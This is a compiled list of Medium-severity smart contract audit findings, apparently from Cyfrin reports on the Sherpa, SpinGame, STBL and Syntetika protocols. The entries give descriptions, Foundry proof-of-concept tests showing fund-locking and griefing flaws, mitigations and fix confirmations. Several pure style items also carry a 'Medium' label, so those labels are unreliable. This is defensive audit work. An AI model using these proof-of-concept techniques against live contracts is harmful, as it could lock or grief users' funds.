Timelocks / delays on `setOperator` and related admin functions would be ineffective given our vault's trust model and architecture. The operator already has manual custody of strategy funds (transferred to fund manager for on and off-chain strategy delegation) and can pause the system at will, meaning any timelock delay could be circumvented by simply pausing withdrawals during the timelock window. The operator must remain changeable for operational flexibility (personnel changes, key rotation) so we cant make it immutable like we did with `keeper` and `setStableWrapper`. The owner role is a 2-of-3 multisig that controls operator selection, so centralization is lessened there as best as we can.

Fixed in commit [`15e2706`](https://github.com/hedgemonyxyz/sherpa-vault-smartcontracts/commit/15e270673d42e02f1e3a08bcba6d1ac61f14010d)

**Cyfrin:** Verified. Both `stableWrapper` and `keeper` now locked after initial assignment which will effectively make them immutable. Operator concern acknowledged.

## [M-126] Some Sherpa USD can never be unstaked due to minimum Supply check
- Severity: `Medium`
- Source report: `sherpa.md`

### Detailed Content (from source)
**Description:** The `SherpaVault::_unstake` function in SherpaVault includes a check that ensures the total assets staked are never less than minimumSupply and greater than 0. However, it is possible for another user to intentionally or unintentionally block a user from unstaking permanently.

```solidity
// Ensure vault maintains minimum supply (allow full exit to 0)
        if (totalStaked - wrappedTokensToWithdraw < vaultParams.minimumSupply &&
            totalStaked - wrappedTokensToWithdraw > 0) {
            revert MinimumSupplyNotMet();
        }
```

For example:
 - Let's assume `minimumSupply` = 1000 SherpaUSD.
 - Alice deposits 1000 SherpaUSD.
 - Malicious Bob deposits 1 wei SherpaUSD. This is allowed since this if statement in function `_stakeInternal` -  `if (totalWithStakedAmount < _vaultParams.minimumSupply) revert MinimumSupplyNotMet();` checks the total staked supply + pending amount i.e. the totalWithStakedAmount, which is now 1000 SherpaUSD + 1 wei SherpaUSD.
 - Alice now cannot exit the system until Bob clears his withdrawal. This occurs due to the minimumSupply check in the `_unstake` function.
 - Alice can only withdraw 1 wei SherpaUSD while the remaining is permanently locked.

Based on the scripts shared, this issue does not pose a risk currently as `minimumSupply` is expected to be 1 USD.

**Recommended Mitigation:** It is recommended to implement either or both of the following recommendations as a safety measure:
1. Implement a setter function to keep the `minimumSupply` configurable.
2. Add check to ensure all users individually deposit above the minimum supply.

**Sherpa:** Fixed in commit [`720c2c0`](https://github.com/hedgemonyxyz/sherpa-vault-smartcontracts/commit/720c2c053d4e22fcb73a7bda97e4282fc749f5f4)

**Cyfrin:** Verified. A minimum deposit enforced. `minimumSupply` left immutable.

## [M-127] Native token prizes cannot be funded due to missing `receive()` function
- Severity: `Medium`
- Source report: `spingame.md`

### Detailed Content (from source)
**Description:** SpinGame supports multiple prize types, including ERC721, ERC20, and native tokens, where native tokens are represented as `prize.tokenAddress = address(0)`.

To ensure that prizes can be successfully claimed, the protocol team is responsible for maintaining a sufficient token balance in the contract by transferring the necessary assets to the Spin contract.

However, there is an issue specifically with native token prizes: the Spin contract does not have a `receive()` or `fallback()` function, and none of its functions are `payable`. This means there is no way for the team to fund the contract with native tokens using a standard transfer, preventing users from successfully claiming native token prizes.

**Impact:** Native token prizes cannot be claimed because there is no mechanism to deposit native tokens into the contract. The only way to provide a native token balance would involve esoteric workarounds, such as self-destructing a contract that sends funds to the Spin contract.


**Proof of Concept:** Add the following test to `Spin.t.sol`:
```solidity
function testTransferNativeToken() public {
    vm.deal(admin,1e18);

    vm.prank(admin);
    (bool success, ) = address(spinGame).call{value: 1e18}("");

    // transfer failed as there is no `receive` or `fallback` function
    assertFalse(success);
}
```

**Recommended Mitigation:** Consider adding a `receive()` function to the contract to allow native token deposits:

```solidity
receive() external payable {}
```

**Linea:** Fixed in commit [`d1ab4bd`](https://github.com/Consensys/linea-hub/commit/d1ab4bdbaac3639a36d66440b9e6da95771e4b34)

**Cyfrin:** Verified.

\clearpage

## [M-128] Arithmetic underflow in `withdraw ERC20` when there is a negative rebasing of asset tokens
- Severity: `Medium`
- Source report: `stbl.md`

### Detailed Content (from source)
**Description:** The vault's accounting is based on the premise that the price of the underlying collateral will grow in perpetuity. While the underlying collateral has the lowest risks, capital is still susceptible to risk, especially when bonds are sold before maturity.
For eg., if ONDO is ever forced to sell underlying bonds at market price and the bond's price is lower than the time they were purchased, that will cause a loss that will most likely mean a negative rebase on the price of `USDY` or `oUSG`.

The vault tracks deposits using deposit-time pricing but calculates withdrawals using current market pricing. When prices decrease, the withdrawal calculation requires more tokens than the vault's accounting system has tracked as available.

The consequences of a negative rebase (requiring more asset units for the same amount of USD) will impact the withdrawal flow [when subtracting the `withdrawAssetValue (and fee)` from the `VaultData.assetDepositNet`](https://github.com/USD-Pi-Protocol/contract/blob/feat/upgradeable/contracts/Assets/LT1/STBL_LT1_Vault.sol#L221-L222), withdrawals will hit an underflow on that operation because the amount of asset units that will be discounted will be greater than the amount of asset units on the `VaultData.assetDepositNet`.

```solidity
    function withdrawERC20(
        address _to,
        YLD_Metadata memory MetaData
    ) external isValidIssuer {
        AssetDefinition memory AssetData = registry.fetchAssetData(assetID);

        // Calculate Withdraw asset value
      uint256 withdrawAssetValue = iSTBL_LT1_AssetOracle(AssetData.oracle)
            .fetchInversePrice(
                ((MetaData.stableValueNet + MetaData.haircutAmount) -
                    MetaData.withdrawfeeAmount)
            ); //@audit gets the latest price -> if price is negative withdrawAssetValue can be greater than assetDepositNet

        ...


      VaultData.assetDepositNet -= (withdrawAssetValue +
            withdrawFeeAssetValue); //@audit if the above happens, assetDepositNet will underflow

        ...
    }

```

**Impact:** Potential denial of service on user withdrawals in the even of negative rebasing of asset prices .

**Proof of Concept:** Add the following function to `STBL_PT1_TestOracle`

```solidity
    function decreasePriceByPercentage(uint256 basisPoints) external {
        require(basisPoints <= 9999, "Cannot decrease more than 99.99%");
        price = (price * (10000 - basisPoints)) / 10000;
    }
```

Then add the following test to `STBL_Test.sol`:

```solidity
   /// @notice Test deposit -> large price decrease -> attempted yield distribution -> withdrawal
    /// @dev This tests accounting integrity under negative price movements and potential underflow risks
    function test_DepositWithdraw1PctPriceDecrease() public {
        console.log("=== 1% PRICE DECREASE TEST ===");

        // Get contracts
        STBL_PT1_TestToken assetToken = STBL_PT1_TestToken(getAssetToken(1));
        STBL_PT1_Issuer stblPT1Issuer = STBL_PT1_Issuer(getAssetIssuer(1));
        STBL_PT1_Vault stblPT1Vault = STBL_PT1_Vault(getAssetVault(1));
        STBL_PT1_TestOracle stblPT1TestOracle = STBL_PT1_TestOracle(getAssetOracle(1));
        STBL_PT1_YieldDistributor yieldDist = STBL_PT1_YieldDistributor(getAssetYieldDistributor(1));

        // === PHASE 0: ENSURE VAULT LIQUIDITY ===
        // Add significant extra tokens directly to vault to ensure liquidity
        // This prevents withdrawal failures due to insufficient vault balance after price drop
        console.log("--- PHASE 0: ENSURE VAULT LIQUIDITY ---");
        uint256 extraLiquidity = 100000e6; // 100,000 extra tokens
        vm.startPrank(admin);
        assetToken.mintVal(address(stblPT1Vault), extraLiquidity);
        vm.stopPrank();

        // Setup treasury
        vm.startPrank(admin);
        registry.setTreasury(admin);
        vm.stopPrank();

        // === PHASE 1: INITIAL DEPOSIT ===
        console.log("--- PHASE 1: DEPOSIT ---");
        uint256 depositAmount = 10000e6;

        vm.startPrank(user1);
        assetToken.approve(address(stblPT1Vault), depositAmount);
        uint256 nftId = stblPT1Issuer.deposit(depositAmount);
        vm.stopPrank();

        // Log initial state
        console.log("Initial deposit NFT ID:", nftId);
        console.log("Initial oracle price:", stblPT1TestOracle.fetchPrice());
        console.log("Initial vault token balance:", assetToken.balanceOf(address(stblPT1Vault)));
        console.log("User USST balance:", usst.balanceOf(user1));

        // Get initial metadata and vault state
        YLD_Metadata memory initialMetadata = yld.getNFTData(nftId);
        VaultStruct memory initialVaultData = stblPT1Vault.fetchVaultData();
        console.log("Asset value:", initialMetadata.assetValue);
        console.log("Stable value net:", initialMetadata.stableValueNet);
        console.log("Initial vault asset deposit net:", initialVaultData.assetDepositNet);
        console.log("Initial vault deposit value USD:", initialVaultData.depositValueUSD);

        // === PHASE 2: ADVANCE TIME FOR YIELD ELIGIBILITY ===
        console.log("\n--- PHASE 2: ADVANCE TIME FOR YIELD ELIGIBILITY ---");
        vm.warp(block.timestamp + initialMetadata.Fees.yieldDuration + 1);
        console.log("Advanced time by:", initialMetadata.Fees.yieldDuration + 1, "seconds");

        // === PHASE 3: LARGE PRICE DECREASE ===
        console.log("\n--- PHASE 3: LARGE PRICE DECREASE ---");

        uint256 initialPrice = stblPT1TestOracle.fetchPrice();
        console.log("Price before decrease:", initialPrice);

        // Simulate 10% price decrease
        stblPT1TestOracle.decreasePriceByPercentage(100);

        uint256 newPrice = stblPT1TestOracle.fetchPrice();
        console.log("Price after decrease:", newPrice);
        console.log("Percentage change:", stblPT1TestOracle.calculatePercentageChange(initialPrice, newPrice));

        // === PHASE 4: CHECK YIELD CALCULATION AFTER PRICE DECREASE ===
        console.log("\n--- PHASE 4: YIELD CALCULATION AFTER PRICE DECREASE ---");

        // Check vault state before potential yield distribution
        VaultStruct memory preYieldVaultData = stblPT1Vault.fetchVaultData();
        console.log("Vault asset deposit net (pre-yield attempt):", preYieldVaultData.assetDepositNet);
        console.log("Vault deposit value USD (pre-yield attempt):", preYieldVaultData.depositValueUSD);

        // Calculate price differential - should be 0 for price decrease
        uint256 priceDifferential = stblPT1Vault.CalculatePriceDifferentiation();
        console.log("Price differential calculated:", priceDifferential);

        // Verify that no yield is distributed when price decreases
        assertEq(priceDifferential, 0, "Price differential should be 0 when price decreases");

        // Attempt yield distribution - should be a no-op
        vm.startPrank(admin);
        stblPT1Vault.distributeYield();
        vm.stopPrank();

        // Check vault state after yield distribution attempt
        VaultStruct memory postYieldVaultData = stblPT1Vault.fetchVaultData();
        console.log("Vault asset deposit net (post-yield attempt):", postYieldVaultData.assetDepositNet);
        console.log("Vault yield fees collected:", postYieldVaultData.yieldFees);

        // Verify no changes occurred during yield distribution
        assertEq(postYieldVaultData.assetDepositNet, preYieldVaultData.assetDepositNet, "assetDepositNet should not change");
        assertEq(postYieldVaultData.yieldFees, preYieldVaultData.yieldFees, "yieldFees should not change");

        // === PHASE 5: WITHDRAWAL UNDER DECREASED PRICE CONDITIONS ===
        console.log("\n--- PHASE 5: WITHDRAWAL UNDER DECREASED PRICE ---");

        // Check if user can still withdraw when asset price has decreased
        uint256 usstBalance = usst.balanceOf(user1);
        console.log("USST balance before withdrawal:", usstBalance);

        vm.startPrank(user1);
        usst.approve(address(usst), usstBalance);
        yld.setApprovalForAll(address(yld), true);

        uint256 preWithdrawVaultBalance = assetToken.balanceOf(address(vault));
        uint256 preWithdrawUserBalance = assetToken.balanceOf(user1);
        console.log("Vault balance before withdrawal:", preWithdrawVaultBalance);
        console.log("User balance before withdrawal:", preWithdrawUserBalance);

        // Attempt withdrawal
        vm.expectRevert();
        stblPT1Issuer.withdraw(nftId, user1);
        vm.stopPrank();

    }
```

**Recommended Mitigation:** Consider modifying `withdrawERC20` to prevent underflows by capping withdrawals to available accounting balance:

```solidity
function withdrawERC20(address _to, YLD_Metadata memory MetaData) external isValidIssuer {
    AssetDefinition memory AssetData = registry.fetchAssetData(assetID);

    uint256 withdrawAssetValue = iSTBL_PT1_AssetOracle(AssetData.oracle)
        .fetchInversePrice(
            ((MetaData.stableValueNet + MetaData.haircutAmount) - MetaData.withdrawfeeAmount)
        );

    uint256 withdrawFeeAssetValue = iSTBL_PT1_AssetOracle(AssetData.oracle)
        .fetchInversePrice(MetaData.withdrawfeeAmount);

    uint256 totalWithdrawal = withdrawAssetValue + withdrawFeeAssetValue;

    // @audit Cap withdrawal to available balance
    if (VaultData.assetDepositNet < totalWithdrawal) {
        uint256 availableWithdrawal = VaultData.assetDepositNet > withdrawFeeAssetValue
            ? VaultData.assetDepositNet - withdrawFeeAssetValue
            : 0;

        withdrawAssetValue = availableWithdrawal;
        VaultData.assetDepositNet = 0; //@audit effectively force this to 0

    } else {
        VaultData.assetDepositNet -= totalWithdrawal;
    }

    // Rest of function continues normally...
}
```

**STBL:** Fixed in commit [c540943](https://github.com/USD-Pi-Protocol/contract/commit/c54094363b196b534c9c36d563851dff31fe2975)

**Cyfrin:** Verified. We note that in the unlikely event of negative rebasing, the current fix reverts when vault becomes insolvent - however, in such a scenario this fix allows early users to withdraw (before insolvency occurs) while it causes denial of service for later users attempting withdrawal.


\clearpage

## [M-129] Insufficient duration validation in `STBL_Register::setup Asset` can lock user withdrawals
- Severity: `Medium`
- Source report: `stbl.md`

### Detailed Content (from source)
**Description:** Lack of duration validation in `STBL_Register::setupAsset` and `STBL_Register::setDurations` allows asset configurations where `yieldDuration > duration`, creating mathematically impossible withdrawal conditions that  lock user funds.

The withdrawal logic requires users to wait at least `yieldDuration` while also withdrawing before duration expires. When `yieldDuration > duration`, no valid time window exists for user withdrawals.


The `iWithdraw` function in `STBL_LT1_Issuer` has the following checks

```solidity
function iWithdraw(uint256 _tokenID, address _sender) internal isSetupDone {
    YLD_Metadata memory MetaData = iSTBL_YLD(registry.fetchYLDToken()).getNFTData(_tokenID);
    // code..

    //ensures that users can't withdraw after duration has passed
        if ((MetaData.depositBlock + MetaData.Fees.duration) < block.timestamp)
            revert STBL_Asset_WithdrawDurationNotReached(assetID, _tokenID);

        //ensures that users must wait for yield duration to withdraw assets
        if (
            (MetaData.depositBlock + MetaData.Fees.yieldDuration) >
            block.timestamp
        ) revert STBL_Asset_YieldDurationNotReached(assetID, _tokenID);

    // @audit withdrawal proceeds only if BOTH conditions are false...
   //@audit when yieldDuration > duration, no withdrawal window exists for users
}
```

**Impact:** Incorrectly configured asset durations can prevent user withdrawals.


**Recommended Mitigation:** Consider adding duration relationship validation in `setupAsset` and `setDurations`

**STBL:** Fixed in commit [c540943](https://github.com/USD-Pi-Protocol/contract/commit/c54094363b196b534c9c36d563851dff31fe2975)

**Cyfrin:** Verified.

## [M-130] Treasury cannot withdraw expired assets if NFT is disabled
- Severity: `Medium`
- Source report: `stbl.md`

### Detailed Content (from source)
**Description:** The `STBL_LT1_Issuer::withdrawExpired` function attempts to claim rewards for disabled NFTs, but the `STBL_LT1_YieldDistributor::claim` function explicitly reverts when called on disabled NFTs.

In `STBL_LT1_Issuer.withdrawExpired`:

```solidity
// If NFT is disabled then claim for yield is not done
if (MetaData.isDisabled) {
    iSTBL_LT1_AssetYieldDistributor(AssetData.rewardDistributor).claim(_tokenID);
}
```
In `STBL_LT1_YieldDistributor.claim`:

```solidity
if (MetaData.isDisabled) revert STBL_YLDDisabled(id);
```


**Impact:** `withdrawExpired` will cause denial of service when metadata is disabled

**Recommended Mitigation:** Consider modifying the existing `claim()` function to allow issuer calls on disabled NFTs:

```solidity
function claim(uint256 id) external returns (uint256) {
  // current logic

   // @audit Allow issuer to claim for disabled NFTs, but block regular users
    if (MetaData.isDisabled && msg.sender != AssetData.issuer) {
        revert STBL_YLDDisabled(id);
    }
}
```

**STBL:** Fixed in commit [1adc1f2](https://github.com/USD-Pi-Protocol/contract/commit/1adc1f2d05dcbcee89826ab9b7d625642c0834bd)

**Cyfrin:** Verified.

\clearpage

## [M-131] `Staking Vault::claim Withdraw` should revert if `assets` are zero
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** `StakingVault::claimWithdraw` should revert if `assets` are zero.

**Syntetika:**
Fixed in commit [2fe18df](https://github.com/SyntetikaLabs/monorepo/commit/2fe18df4891810f3daea17777ba7e1d9d7c80d0f).

**Cyfrin:** Verified.

## [M-132] Missing  `redeem` convenience function in the `Staking Vault.sol`
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** `StakingVault.sol` implements a number of convenience functions: `stake(uint256 assets)` ,`unstake(uint256 assets)` and  `mint(uint256 shares)`:

```solidity
function mint(uint256 shares) external returns (uint256) {
        return mint(shares, msg.sender);
    }

    function stake(uint256 assets) external returns (uint256) {
        return deposit(assets, msg.sender);
    }

    function unstake(uint256 assets) external returns (uint256 shares) {
        return withdraw(assets, msg.sender, msg.sender);
    }
```

But it does not have a convenience function for `redeem`, consider adding one such as:
```solidity
function redeem(uint256 shares) external returns (uint256 shares) {
        return redeem(shares, msg.sender, msg.sender);
    }
```

**Syntetika:**
Fixed in commit [1625c09](https://github.com/SyntetikaLabs/monorepo/commit/1625c09f07d8c43c7cfc3b051e12a3a95c26f32d).

**Cyfrin:** Verified.

## [M-133] Non-compliant users can claim withdrawn assets after the cooldown period
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** `StakingVault::redeem, withdraw` use the `onlyWhitelisted` modifier to verify that `msg.sender` is whitelisted or is compliant, as this modifier ends up calling `Whitelist::isAddressWhitelisted`:
```solidity
function isAddressWhitelisted(address user) public view returns (bool) {
    if (manualWhitelist[user] || globalWhitelist) {
        return true;
    }

    return complianceChecker.isCompliant(user);
}
```

If a user was whitelisted or was compliant when they created the withdrawal/redemption, but was then removed from the whitelist or became non-compliant, they will still be able to call `StakingVault::claimWithdraw` to withdraw their assets after the cooldown period.

**Recommended Mitigation:** `StakingVault::claimWithdraw` should use modifier `onlyWhitelisted(msg.sender)` to ensure that the caller is still whitelisted or compliant; `onlyWhitelisted(receiver)` could also be used to enforce that the destination address is also whitelisted.

**Syntetika:**
Fixed in commit [86384fe](https://github.com/SyntetikaLabs/monorepo/commit/86384fe1504780338649d25f720fb78b25132875) by removing the whitelist functionality entirely from `StakingVault` to resolve finding L-4.

**Cyfrin:** Verified.

## [M-134] Remove `from` parameter from `Minter:redeem` and `_only Sender` function
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** `Minter:redeem` takes a `from` input parameter but then calls `_onlySender` to enforce that `from == msg.sender`.

In this case there is no need for the `from` input parameter for the `_onlySender` function; remove them both and just use `msg.sender` inside `Minter:redeem`.

**Syntetika:**
Fixed in commit [94a2165](https://github.com/SyntetikaLabs/monorepo/commit/94a21650ac63be3d22c545e629ca0283d9664872).

**Cyfrin:** Verified.

## [M-135] Remove obsolete `return` statements when using named return variables
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** Remove obsolete `return` statements when using named return variables:
* `StakingVault::_withdrawTo, redeemTo`

**Syntetika:**
Fixed in commit [bd4bb12](https://github.com/SyntetikaLabs/monorepo/commit/bd4bb1222c2112bd33d02757872831d7f713dcdc).

**Cyfrin:** Verified.

## [M-136] Use `Reentrancy Guard Transient` for faster `non Reentrant` modifiers
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** Use [ReentrancyGuardTransient](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol) for faster `nonReentrant` modifiers:
* `issuance/src/minter/Minter.sol`

**Syntetika:**
Fixed in commit [d5131f6](https://github.com/SyntetikaLabs/monorepo/commit/d5131f6dba14b2595fae28e34065cb05abb9ed36).

**Cyfrin:** Verified.

## [M-137] Use named return variables when this eliminates local variables
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** Use named return variables when this eliminates local variables:
* `CompliantDepositRegistry::getDepositAddresses`
* `StakingVault::redeem`

**Syntetika:**
Fixed in commit [f8f821d](https://github.com/SyntetikaLabs/monorepo/commit/f8f821de057517f9b94963607050b6da2ee647a3).

**Cyfrin:** Verified.

## [M-138] Yield tokens can be permanently locked in the vault when all stakers withdraw during vesting window
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** Yield tokens can be permanently locked in the vault when all stakers withdraw during vesting window.

**Proof of Concept:** Add test to `StakingVaultTest.t.sol`:
```solidity
function test_allStakersWithdrawDuringVestingWindow_LockedTokensInVault() public {
    // Start fresh - check initial state
    assertEq(vault.totalSupply(), 100 ether); // Owner already has 100 from setup

    // Setup: 2 more stakers
    address staker1 = address(0x1);
    address staker2 = address(0x2);

    uint256 stakeAmount = 100 ether;

    // Setup stakers
    vm.startPrank(owner);
    sbtContract.setVerified(staker1, true);
    sbtContract.setVerified(staker2, true);
    asset.mint(staker1, stakeAmount);
    asset.mint(staker2, stakeAmount);
    vm.stopPrank();

    // Each stakes 100 HILBTC
    vm.prank(staker1);
    asset.approve(address(vault), stakeAmount);
    vm.prank(staker1);
    vault.stake(stakeAmount);

    vm.prank(staker2);
    asset.approve(address(vault), stakeAmount);
    vm.prank(staker2);
    vault.stake(stakeAmount);

    // Vault now has 300 HILBTC total (100 owner + 200 from stakers), 300 shares
    assertEq(vault.totalSupply(), 300 ether);
    assertEq(asset.balanceOf(address(vault)), 300 ether);

    // Owner distributes 30 HILBTC yield
    vm.startPrank(owner);
    asset.approve(address(vault), 30 ether);
    vault.distributeYield(30 ether, block.timestamp);
    vm.stopPrank();

    // After 4 hours (50% vested)
    vm.warp(block.timestamp + 4 hours);

    console.log("Before withdrawals:");
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    console.log("Unvested:", vault.getUnvestedAmount());
    console.log("Total assets:", vault.totalAssets());
    console.log("Total shares:", vault.totalSupply());

    // Owner withdraws their 100 shares
    vm.prank(owner);
    vault.redeem(100 ether, owner, owner);

    console.log("\nAfter owner withdrawal:");
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    console.log("Unvested:", vault.getUnvestedAmount());
    console.log("Total assets:", vault.totalAssets());
    console.log("Total shares:", vault.totalSupply());

    // Check if remaining stakers can withdraw
    uint256 staker1Shares = vault.balanceOf(staker1);
    uint256 maxRedeem1 = vault.maxRedeem(staker1);
    console.log("\nStaker1 shares:", staker1Shares);
    console.log("Max redeemable:", maxRedeem1);

    // Try withdrawal
    vm.prank(staker1);
    vault.redeem(staker1Shares, staker1, staker1);

    console.log("\nAfter staker1 withdrawal:");
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    console.log("Total assets:", vault.totalAssets());
    console.log("Total shares:", vault.totalSupply());

    // Can staker2 still withdraw?
    uint256 staker2Shares = vault.balanceOf(staker2);
    uint256 maxRedeem2 = vault.maxRedeem(staker2);
    console.log("\nStaker2 shares:", staker2Shares);
    console.log("Max redeemable:", maxRedeem2);
    console.log("Would receive:", vault.previewRedeem(staker2Shares));

    // Final withdrawal
    vm.prank(staker2);
    vault.redeem(staker2Shares, staker2, staker2);

    console.log("\nFinal state:");
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    console.log("Total shares:", vault.totalSupply());

    // Wait for vesting to complete
    vm.warp(block.timestamp + 4 hours); // Now 8 hours total

    console.log("\nAfter vesting completes:");
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    console.log("Unvested:", vault.getUnvestedAmount());

    // 15000000000000000001 still locked in the vault
    console.log("Total assets:", vault.totalAssets());
    // 0 shares
    console.log("Total supply:", vault.totalSupply());

    // Owner deposits 100 HILBTC
    vm.startPrank(owner);
    asset.approve(address(vault), 100 ether);
    uint256 sharesReceived = vault.deposit(100 ether, owner);
    vm.stopPrank();

    console.log("\nAfter owner re-deposits 100 HILBTC:");
    console.log("Shares received:", sharesReceived);
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    console.log("Total assets:", vault.totalAssets());
    console.log("Share price:", vault.totalAssets() * 1e18 / vault.totalSupply());

    // Owner withdraws all
    vm.prank(owner);
    uint256 withdrawn = vault.redeem(sharesReceived, owner, owner);

    console.log("\nOwner withdrew:", withdrawn);
    // 16428571428571428571 still locked in the vault greater than
    // 15000000000000000001 previously locked!
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    // 0 shares
    console.log("Total shares:", vault.totalSupply());
}
```

**Recommended Mitigation:** Don't allow all shares to be withdrawn; a common technique is on the first deposit to mint 1000 shares to a burn address. Using this technique the owner doesn't need to make the first deposit either.

**Syntetika:**
Fixed in commits [315fd62](https://github.com/SyntetikaLabs/monorepo/commit/315fd620ea68ed473c5169e6b662d341ecb0f92b), [8c6deb1](https://github.com/SyntetikaLabs/monorepo/commit/8c6deb10f509d6cb2f21e5efa2812af00687c1a7) - `StakingVault::deposit` now burns an amount of shares equivalent to the minimum allowed deposit amount (~$10) as the first deposit - the owner is effectively paying a $10 fee to secure the vault.

**Cyfrin:** Experimenting with the new code and modifying our PoC, we found the issue can still manifest even with the dead shares:
```solidity
function test_vestingWithDeadShares() public {
    // Simulate the dead shares implementation
    uint256 DEAD_SHARES = 10000;

    // First deposit by owner triggers dead shares
    vm.startPrank(owner);
    asset.approve(address(vault), 100 ether);
    vault.stake(100 ether);

    // Simulate minting dead shares (in reality this would be in deposit function)
    uint256 actualOwnerShares = vault.balanceOf(owner);
    console.log("Owner shares received:", actualOwnerShares);
    console.log("Total supply (includes dead shares):", vault.totalSupply() + DEAD_SHARES);
    assertEq(actualOwnerShares + DEAD_SHARES, vault.totalSupply());
    vm.stopPrank();

    // Setup 2 more stakers
    address staker1 = address(0x1);
    address staker2 = address(0x2);

    uint256 stakeAmount = 100 ether;

    // Setup and stake
    vm.startPrank(owner);
    asset.mint(staker1, stakeAmount);
    asset.mint(staker2, stakeAmount);
    vm.stopPrank();

    vm.startPrank(staker1);
    asset.approve(address(vault), stakeAmount);
    vault.stake(stakeAmount);
    vm.stopPrank();

    vm.startPrank(staker2);
    asset.approve(address(vault), stakeAmount);
    vault.stake(stakeAmount);
    vm.stopPrank();

    // Current state: 300 HILBTC deposited, 300 shares (+ 1000 dead shares)
    uint256 totalUserShares = vault.totalSupply(); // This would be 1300 with dead shares
    console.log("\nBefore yield distribution:");
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    console.log("Total user shares:", totalUserShares);

    // Owner distributes 30 HILBTC yield
    vm.startPrank(owner);
    asset.approve(address(vault), 30 ether);
    vault.distributeYield(30 ether, block.timestamp);
    vm.stopPrank();

    // After 4 hours (50% vested)
    vm.warp(block.timestamp + 4 hours);

    console.log("\nDuring vesting (4 hours):");
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    console.log("Unvested amount:", vault.getUnvestedAmount());
    console.log("Total assets:", vault.totalAssets());

    // All users withdraw during vesting
    uint256 ownerShares = vault.balanceOf(owner);
    vm.prank(owner);
    vault.redeem(ownerShares, owner, owner);

    uint256 staker1Shares = vault.balanceOf(staker1);
    vm.prank(staker1);
    vault.redeem(staker1Shares, staker1, staker1);

    uint256 staker2Shares = vault.balanceOf(staker2);
    vm.prank(staker2);
    vault.redeem(staker2Shares, staker2, staker2);

    console.log("\nAfter all users withdraw:");
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    console.log("Unvested amount:", vault.getUnvestedAmount());
    console.log("Total assets:", vault.totalAssets());
    console.log("Remaining shares (should be just dead shares):", vault.totalSupply());

    // Wait for vesting to complete
    vm.warp(block.timestamp + 4 hours);

    console.log("\nAfter vesting completes:");
    // 15000000000000010501 tokens locked in vault
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    console.log("Unvested amount:", vault.getUnvestedAmount());
    console.log("Total assets:", vault.totalAssets());
    // only 10000 dead shares remain
    console.log("Dead shares remain:", vault.totalSupply());

    // New user tries to deposit and recover locked funds
    address newUser = address(0x3);
    vm.startPrank(owner);
    asset.mint(newUser, 100 ether);
    vm.stopPrank();

    vm.startPrank(newUser);
    asset.approve(address(vault), 100 ether);
    uint256 sharesReceived = vault.deposit(100 ether, newUser);

    console.log("\nNew user deposits 100 HILBTC:");
    // 66673
    console.log("Shares received:", sharesReceived);
    // 115000000000000010501
    console.log("Vault balance:", asset.balanceOf(address(vault)));
    console.log("Total assets:", vault.totalAssets());

    // New user immediately withdraws to see how much they can recover
    uint256 withdrawAmount = vault.redeem(sharesReceived, newUser, newUser);
    console.log("\nNew user withdraws all shares:");
    // user received 99999934788846293400 tokens
    console.log("Amount received:", withdrawAmount);
    // user lost 65211153706600 tokens
    console.log("Loss:", 100 ether - withdrawAmount);
    // vault locked balance increased to 15000065211153717101
    console.log("Vault balance (still locked):", asset.balanceOf(address(vault)));
    vm.stopPrank();
}
```

**Recommended Mitigation:** * The simplest option is to remove the 8-hour vesting period and allow the yield to be collected when it is deposited into the contract. As long as there is a sufficiently long cooldown period (default 90 days), this deters "just in time" attacks where users deposit large amounts to collect most of the yield then immediately withdraw. The yield distribution transaction could also be run through particular [services](https://docs.flashbots.net/flashbots-protect/overview) designed to prevent front-running to further protect against "just in time" attacks

* A more complicated option is to:

1) have the owner deposit in addition to the dead shares, such that any "locked" tokens effectively accrue to the owner's stake as well as the dead shares. In this case ensure that the owner's deposit is much greater than the dead shares. If the owner is the last one to withdraw, then don't distribute anymore yield afterwards
2) in `_withdraw`, check if this transaction would result in only the dead shares remaining
3) if true, then check if the unvested amount > 0
4) if true, reset the unvested amount and send the unvested amount to the contract owner (or another contract)
```solidity
// After the operation, check if only dead shares remain
if (totalSupply() - shares == deadShares) {
    uint256 remainingUnvested = getUnvestedAmount();
    if(remainingUnvested > 0) {
        vestingAmount = 0;
        lastDistributionTimestamp = 0;
        IERC20(asset()).safeTransfer(owner(), remainingUnvested);
    }
}
```

Additionally consider implementing a "sunset" feature where:
* the admin can initiate the "sunset" process; this prevents new deposits and mints but allows users to redeem or withdraw. It also sets a `sunsetTimestamp` 6 months into the future
* once either only the `DEAD_SHARES` remain (all stakers have withdrawn) OR `block.timestamp > sunsetTimestamp`, the admin can call a special function that performs the "rescue" transferring all asset tokens to the admin

This provides a nice way to "sunset" the vault and collect any remaining tokens, while giving users plenty of time to withdraw and protecting them from a rugpull.

**Syntetika:**
Fixed in commits [1625c09](https://github.com/SyntetikaLabs/monorepo/commit/1625c09f07d8c43c7cfc3b051e12a3a95c26f32d), [8113753](https://github.com/SyntetikaLabs/monorepo/commit/8113753148d12ee24ec26713f3fc76b2cd12cf54), [347330a](https://github.com/SyntetikaLabs/monorepo/commit/347330a078470164c51074b3a8bc2cb141fa9ca8) by:
* mint 1000 "dead shares" to the burn address with the first deposit
* the first deposit can only be done by the admin, who will do a significantly bigger (at least 10x) deposit than the dead shares
* the admin will keep this stake active such that any "lost" unvested amounts accrue to the admin and the dead shares
